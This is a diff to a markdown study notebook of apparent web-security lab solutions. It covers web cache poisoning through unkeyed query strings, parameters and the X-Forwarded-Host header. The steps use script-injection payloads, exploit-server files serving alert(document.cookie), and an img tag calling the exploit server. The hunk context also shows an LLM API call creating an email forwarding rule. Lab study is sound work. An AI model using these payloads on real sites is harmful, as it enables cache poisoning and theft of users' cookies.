@@ -3736,11 +3736,11 @@ LLM -> API: create_email_forwarding_rule('peter')
     Response
     <script type="text/javascript" src="//examplle.com/resources/js/tracking.js"></script>
     ```
-  - Exploit server
-    file: /resources/js/tracking.js
+  - Exploit server  
+    file: /resources/js/tracking.js  
     body: alert(document.cookie)  
   - Post a comment
-    <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+    `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
   - In access log, copy the victim user-agent, go back repeater and replace with it.  
   - Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers
   - Replay the request to keep the cache poisoned until the victim visits the site
@@ -3868,10 +3868,10 @@ LLM -> API: create_email_forwarding_rule('peter')
 - Web cache poisoning via an **unkeyed query string**
   - inducing the victim to visit a maliciously crafted URL. This has the potential to impact a far greater number of victims with no further interaction from the attacker.
     `GET /?evil='/><script>alert(1)</script>`
-  - once your payload is cached, browse the home page
+  - replay the request untill X-Cache: hit, browse the home page > pop up alert > wait victim browse
 - Web cache poisoning via an **unkeyed query parameter**
   - `GET /?utm_content='/><script>alert(1)</script>`
-  - once your payload is cached, browse the home page
+  - when X-Cache: hit, browse the home page
     Response: XXX 
 - **Parameter** cloaking
   - brute force unkey parameter > "utm_content"
@@ -3922,18 +3922,17 @@ LLM -> API: create_email_forwarding_rule('peter')
     alert(1)$$#
     ```
 - **Internal cache poisoning (Expert)**
+  - Exploit server
+    file: /js/geolocate.js  
+    body: alert(document.cookie)  
   - Keep sending the request
     ```
     GET / 
     X-Forwarded-Host: exploit-0a860086033b6635828482c5014800bf.exploit-server.net
     ```
   - most of the times, you will see 3 times exploit url found in response but /geolocate.js?callback=loadCountry remain same
-  - Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL
-  - Remove `X-Forwarded-Host` and resend the request. Notice that only 2 times exploit url found in response
-  - Exploit server
-    file: /js/geolocate.js
-    body: alert(document.cookie)
-  - Repeater > resend with X-Forwarded-Host untill all thress of the dynamic URLs in the resposne point to your exploit server  
+  - Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL (4 times exploit url)  
+  - Remove `X-Forwarded-Host` and resend the request. Notice that only 2 times exploit url found in response. This indicates that the header is unkeyed by the internal cache but keyed by the external one.
 
 ## HTTP Host Header
 - The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access.
